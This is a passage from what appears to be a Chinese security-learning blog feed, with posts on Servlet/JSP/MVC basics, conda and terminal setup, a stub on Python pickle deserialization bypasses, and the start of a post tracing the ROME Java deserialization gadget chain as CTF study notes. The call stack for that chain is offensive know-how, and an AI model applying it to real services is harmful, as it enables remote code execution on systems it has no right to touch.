class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ServletDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        pw.write(<span class="string">&quot;&lt;h1&gt;hello servlet&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        pw.write(<span class="string">&quot;&lt;h2&gt;welcome to javaweb&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        pw.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="补充：嵌入式tomcat运行Servlet"><a href="#补充：嵌入式tomcat运行Servlet" class="headerlink" title="补充：嵌入式tomcat运行Servlet"></a>补充：嵌入式tomcat运行Servlet</h3><blockquote><p>这个方法一开始是用于开发时进行debug方便的，但是存在一个问题，导war包比较难<br>更好的选择: 现在1dae允许通过edit configuration来实时debug，而且还容易配置，后续到处war包也方便</p></blockquote><ol><li>这里就<a href="https://liaoxuefeng.com/books/java/web/servlet-dev/index.html">贴个链接</a>吧，就不浪费时间写了嘻嘻</li></ol><h3 id="进阶Servlet"><a href="#进阶Servlet" class="headerlink" title="进阶Servlet"></a>进阶Servlet</h3><blockquote><p>一个Web App就是由一个或多个Servlet组成的，每个Servlet通过注解说明自己能处理的路径<br>早期的Servlet需要在web.xml中配置映射路径，但Servlet3.0版本后只需要通过注解就可以完成映射</p></blockquote><p><img src="/pic/Java%E5%AE%89%E5%85%A86(1)_%E5%88%9D%E8%AF%86JavaWeb/javaweb_servlets.png" alt="总体架构"></p><ol><li><p>根据路径转发的功能我们一般称为dispatch。映射到&#x2F;的IndexServlet比较特殊，它实际上会接收所有未匹配的路径，相当于&#x2F;*，因为Dispatcher的逻辑可以用伪代码实现如下</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> ...</span><br><span class="line"><span class="keyword">if</span> (path.equals(<span class="string">&quot;/hello&quot;</span>)) &#123;</span><br><span class="line">    dispatchTo(helloServlet);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (path.equals(<span class="string">&quot;/signin&quot;</span>)) &#123;</span><br><span class="line">    dispatchTo(signinServlet);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 所有未匹配的路径均转发到&quot;/&quot;</span></span><br><span class="line">    dispatchTo(indexServlet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="HttpServlet-自定义处理请求"><a href="#HttpServlet-自定义处理请求" class="headerlink" title="HttpServlet: 自定义处理请求"></a>HttpServlet: 自定义处理请求</h4><ol><li><p>只需要Override重写HttpServlet中的doGet等函数即可</p></li><li><p>如果不进行自定义，会根据情况返回405，下面是get方法的，其他方法也一样的</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> req.getProtocol();</span><br><span class="line">    <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> lStrings.getString(<span class="string">&quot;http.method_get_not_supported&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (protocol.endsWith(<span class="string">&quot;1.1&quot;</span>)) &#123;</span><br><span class="line">        resp.sendError(<span class="number">405</span>, msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resp.sendError(<span class="number">400</span>, msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="HttpServletRequest和HttpServletResponse"><a href="#HttpServletRequest和HttpServletResponse" class="headerlink" title="HttpServletRequest和HttpServletResponse"></a>HttpServletRequest和HttpServletResponse</h4><blockquote><p>方法很多就不放了，具体用到再找就好了，总结就是对http响应或者请求设置头等内容</p></blockquote><ol><li>我们不需要直接处理HTTP协议。具体的实现类是由各服务器提供的，而我们编写的Web应用程序只关心接口方法，并不需要关心具体实现的子类</li><li>HttpServletRequest<ol><li>封装了一个HTTP请求，它实际上是从ServletRequest继承而来。最早设计Servlet时，设计者希望Servlet不仅能处理HTTP，也能处理类似SMTP等其他协议，因此，单独抽出了ServletRequest接口，但实际上除了HTTP外，并没有其他协议会用Servlet处理，所以这是一个过度设计。</li></ol></li><li>HttpServletResponse<ol><li>封装了一个HTTP响应。由于HTTP响应必须先发送Header，再发送Body，所以，操作HttpServletResponse对象时，必须先调用设置Header的方法，最后调用发送Body的方法。</li><li><strong>注意</strong>: 写入完毕后调用flush()却是必须的，因为大部分Web服务器都基于HTTP&#x2F;1.1协议，会复用TCP连接。如果没有调用flush()，将导致缓冲区的内容无法及时发送到客户端。此外，写入完毕后千万不要调用close()，原因同样是因为会复用TCP连接，如果关闭写入流，将关闭TCP连接，使得Web服务器无法复用此TCP连接。</li></ol></li></ol><h4 id="Servlet的多线程模型"><a href="#Servlet的多线程模型" class="headerlink" title="Servlet的多线程模型"></a>Servlet的多线程模型</h4><ol><li>一个Servlet类在服务器中<strong>只有一个实例</strong>，但对于每个HTTP请求，Web服务器会使用多线程执行请求。因此，一个Servlet的doGet()、doPost()等处理请求的方法是多线程并发执行的。如果Servlet中定义了字段，要注意多线程并发访问的问题，比如map等容器的处理</li><li>对于每个请求，Web服务器会创建唯一的HttpServletRequest和HttpServletResponse实例，因此，HttpServletRequest和HttpServletResponse实例只有在当前处理线程中有效，<strong>它们总是局部变量，不存在多线程共享的问题</strong><ol><li><strong>影响自己</strong>：在doGet()或doPost()方法中，如果使用了ThreadLocal，但没有清理，那么它的状态很可能会影响到下次的某个请求，因为Servlet容器很可能用线程池实现线程复用。</li></ol></li></ol><h4 id="more-servlet"><a href="#more-servlet" class="headerlink" title="more servlet"></a>more servlet</h4><p>Servlet的生命周期由三个主要阶段组成：</p><p>加载和初始化：当Web容器启动时，或者第一次接收到针对某个Servlet的请求时，Servlet会被实例化并调用init()方法进行初始化。这个阶段只发生一次。<br>服务：一旦Servlet被初始化，它就可以通过service()方法处理来自客户端的请求。对于HTTP协议，这通常是通过doGet()或doPost()方法实现的。<br>销毁：当Servlet不再需要时（例如，Web应用关闭），Web容器会调用destroy()方法来清理资源。之后，Servlet对象将被垃圾回收。</p><p>在Servlet容器中运行的Servlet具有如下特点：</p><p>无法在代码中直接通过new创建Servlet实例，必须由Servlet容器自动创建Servlet实例；<br>Servlet容器只会给每个Servlet类创建唯一实例；<br>Servlet容器会使用多线程执行doGet()或doPost()方法。</p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><h3 id="什么是JSP"><a href="#什么是JSP" class="headerlink" title="什么是JSP"></a>什么是JSP</h3><blockquote><p>JSP本身目前已经很少使用，只需要了解其基本用法即可: 现代的MVC框架(如：Spring MVC 5.x)已经完全抛弃了JSP技术，采用了模板引擎(如：Freemark)或者RESTful的方式来实现与客户端的交互工作</p></blockquote><ol><li><strong>本质</strong>: JSP是一种在HTML中嵌入动态输出(Java)的文件，它和Servlet正好相反，Servlet是在Java代码中嵌入输出HTML<ol><li>Jsp-&gt;Servelt: JSP和Servlet有什么区别？其实它们没有任何区别，因为<strong>JSP在执行前首先被编译成一个Servlet</strong>。在Tomcat的临时目录下，可以找到一个hello_jsp.java的源文件，这个文件就是Tomcat把JSP自动转换成的Servlet源码</li></ol></li><li>JSP是Java Server Pages的缩写，它的文件必须放到可访问目录下，文件名必须以.jsp结尾</li></ol><h3 id="JSP中的概念"><a href="#JSP中的概念" class="headerlink" title="JSP中的概念"></a>JSP中的概念</h3><ol><li><p>实际上是一个html</p></li><li><p><strong>内置了变量</strong>: 可以直接访问， JSP 引擎在调用 JSP 对应的 jspServlet 时，会传递或创建9个与web开发相关的对象供jspServlet使用</p><table><thead><tr><th>变量名</th><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>pageContext</td><td>PageContext</td><td>当前页面共享数据，还可以获取其他8个内置对象</td></tr><tr><td>request</td><td>HttpServletRequest</td><td>客户端请求对象，包含了所有客户端请求信息</td></tr><tr><td>session</td><td>HttpSession</td><td>请求会话</td></tr><tr><td>application</td><td>ServletContext</td><td>全局对象，所有用户间共享数据</td></tr><tr><td>response</td><td>HttpServletResponse</td><td>响应对象，主要用于服务器端设置响应信息</td></tr><tr><td>page</td><td>Object</td><td>当前Servlet对象,this</td></tr><tr><td>out</td><td>JspWriter</td><td>输出对象，数据输出到页面上</td></tr><tr><td>config</td><td>ServletConfig</td><td>Servlet的配置对象</td></tr><tr><td>exception</td><td>Throwable</td><td>异常对象</td></tr></tbody></table></li><li><p><strong>JSP有三大指令</strong></p><ol><li><code>&lt;%@ page ... %&gt;</code> 可以引入java类，定义网页依赖属性，比如脚本语言、error页面、缓存需求等等</li><li><code>&lt;%@ include ... %&gt;</code> 另一个jsp文件，包含其他文件（静态包含）</li><li><code>&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</code> 引入标签库的定义<ol><li>JSP Tag需要正确引入taglib的jar包，并且还需要正确声明，使用起来非常复杂，对于页面开发来说，不推荐使用JSP Tag，后续有更简单的模板引擎，taglib就略</li></ol></li></ol></li><li><p><strong>JSP标准库(JSTL)</strong></p><ol><li>JSTL支持通用的、结构化的任务，比如迭代，条件判断，XML文档操作，国际化标签，SQL标签。 除了这些，它还提供了一个框架来使用集成JSTL的自定义标签</li></ol></li><li><p><strong>JSP表达式(el)</strong></p><ol><li>包含在<code>&lt;%--</code>和<code>--%&gt;</code>之间的是JSP的注释，它们会被完全忽略</li><li>包含在<code>&lt;%</code>和<code>%&gt;</code>之间的是Java代码，可以编写任意Java代码；</li><li>如果使用<code>&lt;%= xxx %&gt;</code>则可以快捷输出一个变量的值</li></ol>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World - JSP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &lt;%-- JSP Comment --%&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    &lt;%</span><br><span class="line">         out.println(&quot;Your IP address is &quot;);</span><br><span class="line">    %&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color:red&quot;</span>&gt;</span></span><br><span class="line">        &lt;%= request.getRemoteAddr() %&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="JSESSION"><a href="#JSESSION" class="headerlink" title="JSESSION"></a>JSESSION</h2><h2 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h2><h3 id="什么是MVC"><a href="#什么是MVC" class="headerlink" title="什么是MVC"></a>什么是MVC</h3><ol><li>概念图如下<img src="/pic/Java%E5%AE%89%E5%85%A86(1)_%E5%88%9D%E8%AF%86JavaWeb/javaweb_mvc_example.png" alt="概念图如下"><ol><li>Servlet作为Controller处理业务的逻辑</li><li>获得到数据的集成Model，这里使用JavaBean实现</li><li>最终将Model发送到View也就是这里的JSP中进行渲染</li></ol></li><li>可以实现功能的解耦<ol><li>Controller专注于业务处理，它的处理结果就是Model。Model可以是一个JavaBean，也可以是一个包含多个对象的Map，Controller只负责把Model传递给View，View只负责把Model给“渲染”出来</li></ol></li></ol><h3 id="一个更加成熟的MVC"><a href="#一个更加成熟的MVC" class="headerlink" title="一个更加成熟的MVC"></a>一个更加成熟的MVC</h3><blockquote><p>上述通过Servlet和JSP讲述了MVC的概念，这里通过更加实际可行的方式搭建一个MVC的示例</p></blockquote><ol><li>实现思想<img src="/pic/Java%E5%AE%89%E5%85%A86(1)_%E5%88%9D%E8%AF%86JavaWeb/javaweb_mvc_impl.png" alt="实现图"><ol><li><p>使用普通的Java类实现Controller: 业务逻辑最好由纯粹的Java类实现，而不是强迫继承自Servlet</p></li><li><p>创建一个接收所有请求的Servlet</p></li><li><p>DispatcherServlet</p><ol><li>总是映射到&#x2F;，跟据不同的Controller的方法定义的@Get或@Post的Path决定调用哪个方法</li><li>存储请求路径到某个具体方法的映射</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DispatcherServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, GetDispatcher&gt; getMappings = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, PostDispatcher&gt; postMappings = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Controller</p><ol><li>其中的每一个函数作为一个小的控制器，用于处理业务逻辑</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/signin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">signin</span><span class="params">()</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/signin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">doSignin</span><span class="params">(SignInBean bean)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/signout&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">signout</span><span class="params">(HttpSession session)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>JSP<ol><li><a href="https://www.javasec.org/javaweb/JSP.html">javasec</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
            <tag> Java安全 </tag>
            
            <tag> Java内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python反序列化2_绕过手法</title>
      <link href="/2024/11/28/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962_%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/"/>
      <url>/2024/11/28/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962_%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="pickle绕过方法"><a href="#pickle绕过方法" class="headerlink" title="pickle绕过方法"></a>pickle绕过方法</h2><h3 id="1-全局变量绕过"><a href="#1-全局变量绕过" class="headerlink" title="1. 全局变量绕过"></a>1. 全局变量绕过</h3><h4 id="法一：全局引用"><a href="#法一：全局引用" class="headerlink" title="法一：全局引用"></a>法一：全局引用</h4><h4 id="法二：b操作符-setstate"><a href="#法二：b操作符-setstate" class="headerlink" title="法二：b操作符__setstate__"></a>法二：b操作符<code>__setstate__</code></h4>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员编程环境的配置</title>
      <link href="/2024/11/26/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/11/26/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>jetbrains是真好用，还有<a href="https://www.jetbrains.com/help/idea/sharing-your-ide-settings.html">生态同步</a></p></blockquote><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="ide"><a href="#ide" class="headerlink" title="ide"></a>ide</h3><ol><li>windows: pycharm</li><li>wsl: vscode</li><li>包管理: conda + pip</li></ol><h3 id="pycharm中使用conda"><a href="#pycharm中使用conda" class="headerlink" title="pycharm中使用conda"></a>pycharm中使用conda</h3><ol><li>注意到是conda再windows下可执行文件的路径在<code>...\Anaconda\Scirpts\conda.exe</code></li><li><a href="https://www.jetbrains.com/help/pycharm/conda-support-creating-conda-virtual-environment.html#conda-requirements">中途切换，官方文档</a></li><li><a href="https://docs.anaconda.com/working-with-conda/ide-tutorials/pycharm/">创建项目，官方文档</a></li></ol><h3 id="conda与pip的包管理"><a href="#conda与pip的包管理" class="headerlink" title="conda与pip的包管理"></a>conda与pip的包管理</h3><ol><li><p>在conda中下载pip，主conda辅pip就ok</p><ol><li>pip可以换下清华源（清华源里有操作的）</li><li>pip安装的包将存储在Conda环境的envs&#x2F;your_env_name&#x2F;lib&#x2F;pythonX.X&#x2F;site-packages目录下</li><li>pip的依赖问题: 使用conda解决<code>conda install numpy --force</code></li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># 1. 下载pip</span></span><br><span class="line">conda activate you_env</span><br><span class="line">conda install pip</span><br><span class="line"></span><br><span class="line"> <span class="comment"># 2. 包更新</span></span><br><span class="line">conda update pip</span><br><span class="line">conda update numpy</span><br><span class="line">pip install --upgrade numpy</span><br><span class="line"></span><br><span class="line"> <span class="comment"># 3. 包卸载</span></span><br><span class="line"> conda remove numpy</span><br><span class="line"> conda clean --all</span><br><span class="line"> pip uninstall numpy</span><br></pre></td></tr></table></figure></li><li><p>常见Q&amp;A</p><ol><li>如果在一个环境env_a中用pip安装了某包，在env_b中可用吗？<ol><li>不可用</li></ol></li><li>如果在base中用pip安装安装了某包，在其他环境中可用吗？<ol><li>conda似乎只是以类似文件链接方式在子环境中实现base已安装包复用，实际如果子环境中不安装同版本是完全隔离的。pip实测更是完全隔离的</li></ol></li><li>如何判断conda中某个包是通过conda还是pip安装的<ol><li>conda list ，用pip安装的包显示的build项目为pypi</li></ol></li><li>如何使用Conda和pip进行环境复制<ol><li>可以复制一个环境，并在新环境中使用pip安装额外的包。</li></ol></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows半全键盘配置😋</title>
      <link href="/2024/11/25/windows%E5%8D%8A%E5%85%A8%E9%94%AE%E7%9B%98%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/11/25/windows%E5%8D%8A%E5%85%A8%E9%94%AE%E7%9B%98%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>不喜欢把手从键盘移动到鼠标的感觉，干脆直接画时间配置一下<br>一个简要的题纲，后续搞个github仓库整理一下</p></blockquote><h2 id="配置哲学"><a href="#配置哲学" class="headerlink" title="配置哲学"></a>配置哲学</h2><ol><li><strong>尽量熟悉原厂</strong>: 对于一些比较不方便的才进行自定义的设置</li><li><strong>组合&gt;一刀切</strong>: win和linux都很好😍</li></ol><h2 id="小提纲"><a href="#小提纲" class="headerlink" title="小提纲"></a>小提纲</h2><ol><li>windows<ol><li>PowerToys</li><li>cmd</li><li>git(gitbash)</li><li>Batch(.bat)</li><li>快捷键</li></ol></li><li>wsl<ol><li>bash</li></ol></li><li>ide<ol><li>vscode+vim ext</li><li>jetbrains+vim ext</li><li>快捷键</li></ol></li></ol><h2 id="windows终端配置"><a href="#windows终端配置" class="headerlink" title="windows终端配置"></a>windows终端配置</h2><ol><li>我的选择：git bash(主) + cmd(辅)</li><li>其他选择<ol><li>cmder</li></ol></li></ol><h3 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h3><h4 id="cmdrc-bat-“-bashrc”"><a href="#cmdrc-bat-“-bashrc”" class="headerlink" title=".cmdrc.bat(“.bashrc”)"></a>.cmdrc.bat(“.bashrc”)</h4><blockquote><p>windows中并没有这样的一个文件，这个我用的配置文件而已</p></blockquote><ol><li><p>随便一个目录下设置一个.cmdrc.txt文件</p></li><li><p>进行编辑写入比如下列的脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@echo</span> off</span><br><span class="line">set greet=hello world</span><br></pre></td></tr></table></figure></li><li><p>win+r regedit进入注册表，ctrl+f搜索Command Processor，等一下就有了，我这里网上有些大小写差异，要ctrl+f才行，我的是<code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor</code></p></li><li><p>这里添加“字符串”，将选项名称改为AutoRun，一定要AutoRun，然后添加上你的.cmdrc.bat的路径</p></li><li><p>重新打开一个cmd，<code>echo %greet%</code>发现可以运行</p></li><li><p>重新加载似乎只有重启</p></li></ol><h4 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h4><ol><li>再.cmdrc.bat中添加<code>chcp 65001 &gt; nul</code>即可</li></ol><h4 id="windows中的Vim"><a href="#windows中的Vim" class="headerlink" title="windows中的Vim"></a>windows中的Vim</h4><ol><li>下载后记得添加path里就好，是由.exe文件那个目录就好，不用精细到vim.exe</li><li>自定义在“项目”根目录下的_vimrc就ok</li><li><a href="https://www.huangdc.com/421">老哥的配置参考</a></li></ol><h4 id="Scoop和winget"><a href="#Scoop和winget" class="headerlink" title="Scoop和winget"></a>Scoop和winget</h4><blockquote><p>类似于apt的包管理器</p></blockquote><ol><li>个人现在还不需要，先放着知道有这个东西</li></ol><h2 id="wsl终端配置"><a href="#wsl终端配置" class="headerlink" title="wsl终端配置"></a>wsl终端配置</h2><h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><blockquote><p>.tmux.conf具体配置见github</p></blockquote><ol><li><strong>S1: 下载tmux管理插件</strong>，<code>git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm</code>，需要时就创建目录</li><li><strong>S2: 自定义文件</strong>，在~目录中需要.tmux.conf文件中进行设置，编写完毕后<code>tmux</code>进入模式，可能就生效了，没有就在ctrl+b接:再<code>source-file ~/.tmux.conf</code>，完成配置</li></ol>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(14)_rome</title>
      <link href="/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/"/>
      <url>/2024/11/24/Java%E5%AE%89%E5%85%A85(14)_rome/</url>
      
        <content type="html"><![CDATA[<h3 id="引入与版本条件"><a href="#引入与版本条件" class="headerlink" title="引入与版本条件"></a>引入与版本条件</h3><ol><li><p>版本(无再重述的)</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * rome 1.0</span></span><br><span class="line"><span class="comment"> * jdk: jdk7u21(复现非要求)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>敏感点</strong>都是再ToStringBean.toString(String)这个地方，这一篇的不同链只是到达方式不同</p></li></ol><h2 id="HashMap利用链"><a href="#HashMap利用链" class="headerlink" title="HashMap利用链"></a>HashMap利用链</h2><h3 id="HashMap-Gadget-CB1"><a href="#HashMap-Gadget-CB1" class="headerlink" title="HashMap Gadget: ?+CB1"></a>HashMap Gadget: ?+CB1</h3><ol><li><p>见下</p><ol><li>顺着看的时候突然发现其实找链子是从最终的执行点出发，但是中间是可以有源-&gt;终的小推测的(可以放飞想象力，期间的思维还是要偏向执行点)，主要还是从后向前</li><li>这里的toString是在TiedMapEntry(CC库中的)之后的又一调用toString()方法的链子</li><li>小小总结一下执行点<ol><li>方法调用</li><li>getter</li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line">    HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">        ObjectBean.hashCode()</span><br><span class="line">            EqualsBean.beanHashCode()</span><br><span class="line">                ObjectBean.toString()   <span class="comment">// 容易想到CC5，但是原理是不同，CC5基于CC</span></span><br><span class="line">                    ToStringBean.toString()</span><br><span class="line">                        ToStringBean.toString(String)</span><br><span class="line">                            Method.invoke(Object, Object...)</span><br><span class="line">                                